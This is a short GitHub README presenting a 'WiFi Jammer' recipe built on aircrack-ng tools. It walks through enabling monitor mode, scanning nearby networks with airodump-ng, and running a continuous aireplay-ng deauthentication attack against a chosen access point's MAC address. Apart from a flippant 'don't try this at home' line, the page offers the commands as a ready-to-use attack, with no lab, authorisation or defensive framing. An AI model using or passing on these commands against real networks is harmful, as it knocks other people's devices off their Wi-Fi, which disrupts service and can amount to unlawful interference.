
<h1 align="center">Welcome to Repositorie of WiFi Jammer 👋</h1>
<p>
<img src="https://img.shields.io/badge/version-0.1-blue.svg?cacheSeconds=2592000" />
</p>
<img src="https://raw.githubusercontent.com/AnandKatariya/Kali-Linux-Jupyter-Notebook-Installation/a9eea7518be7dadfdc60ac934d98e59735590209/Image/made-with-kali-linux.svg" >


### 🏠 [Homepage](https://github.com/AnandKatariya?tab=repositories)
<p align =center >
  <img src="https://thumbs.gfycat.com/EvergreenPolishedBunny-max-1mb.gif" height='246' width='250' />
</p>

<h1 align="center">Dont try this at Home, School,Or any other public place!!!</h1>
<br>

<h1 align="center"> Introduction to WiFi Jammer </h1>
<p>
 
## Check
```sh
iwconfig
```
Check weather the mode is on moniter mode or managed mode.

  ## Clear all stuff

```sh
airmon-ng check kill
```
check and kill off processes that might interfere with the aircrack-ng suite.

  ## Moniter mode

```sh
airmon-ng start wlan0
```
Airmon-ng is used to read all the packets of data even if they are not sent to us. It controls the traffic received only on the wired/wireless networks. Wi-Fi adapters are mainly used for connecting your device to the internet. Most laptops, tablets, and mobile phones have an inbuild Wi-Fi card.

  ## Search the target

```sh
airodump-ng wlan0mon
```
After doing this you will able to see a interface that will show you wifi network around you which are available and with this you will able to see many other columns such as CH (channel), bssid and many more.

  ## Jamming The WiFi

```sh
aireplay-ng --deauth 0 -a <target_mac> wlan0mon
```
